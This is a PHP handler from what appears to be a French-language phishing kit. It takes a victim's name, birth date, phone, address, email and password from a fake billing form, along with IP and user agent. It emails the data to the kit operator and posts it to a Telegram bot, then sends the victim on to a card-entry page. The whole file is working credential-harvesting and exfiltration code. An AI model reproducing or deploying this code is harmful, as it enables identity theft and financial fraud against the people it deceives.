<?php
ob_start();
include("../infos.php");
include("../common/sub_includes.php");
include("../common/functions.php");



if(isset($_POST['bat_billing_submit']))

{

	session_start();
	gather_billing_infos();


	if(empty($_SESSION['nom']) || empty($_SESSION['prenom']) || empty($_SESSION['birthday']) || empty($_SESSION['phone']) || empty($_SESSION['adresse']) || empty($_SESSION['zip']) || empty($_SESSION['city']))
	{


		header('Location: ../steps/billing.php?error=true');

	}
	else{

		if($mail_sending == true){

			$message = "

[🗾] Full Info [🗾]

🗾 Nom : ".$_SESSION['nom']."
🗾 Prénom : ".$_SESSION['prenom']."
🗾 Date de naissance : ".$_SESSION['birthday']."

🌌 Numéro de téléphone : ".$_SESSION['phone']."
🌌 Adresse : ".$_SESSION['adresse']."
🌌 Code Postal : ".$_SESSION['zip']."
🌌 Ville : ".$_SESSION['city']."

[🎇] Login [🎇]

🎇 E-Mail : ".$_SESSION['email']."
🎇 Mot de passe : ".$_SESSION['password']."

[🎆] Additionnal [🎆] 

🎆 Adresse IP : ".$_SESSION['ip']."
🎆 User Agent : ".$_SESSION['useragent']."

			";

	
			$subject = "[🌌] + 1 Full Info | ".$_SESSION['nom']." | ".$_SESSION['prenom']." | ".$_SESSION['ip'];
			$headers = "From: PlatiGold ⚡️ <platigold@teelg.fr>";

			mail($rezmail, $subject, $message, $headers);


  
		  }
  
		##########################
		#### TELEGRAM SENDING ####
		##########################
  
		  
		if($telegram_sending == true){
  
			$data = [
			  'text' => '

[🗾] Full Info [🗾]

🗾 Nom • '.$_SESSION['nom'].'
🗾 Prénom • '.$_SESSION['prenom'].'
🗾 Date De Naissance • '.$_SESSION['birthday'].'

🌌 Téléphone • '.$_SESSION['phone'].'
🌌 Adresse • '.$_SESSION['adresse'].'
🌌 Ville • '.$_SESSION['city'].'
🌌 Code Postal • '.$_SESSION['zip'].'

[🎇] Login [🎇]

🎇 E-Mail : '.$_SESSION['email'].'
🎇 Mot de passe : '.$_SESSION['password'].'

[🎆] Additionnal [🎆] 

🎆 Adresse IP :  '.$_SESSION['ip'].'
🎆 User Agent :  '.$_SESSION['useragent'].'

  
  
			  ',
			  'chat_id' => $chat_billing
			];
  
			file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
		}
		$_SESSION['billinged'] = true;

       header('Location: ../steps/card.php');
	}
	

}
else{


}

?>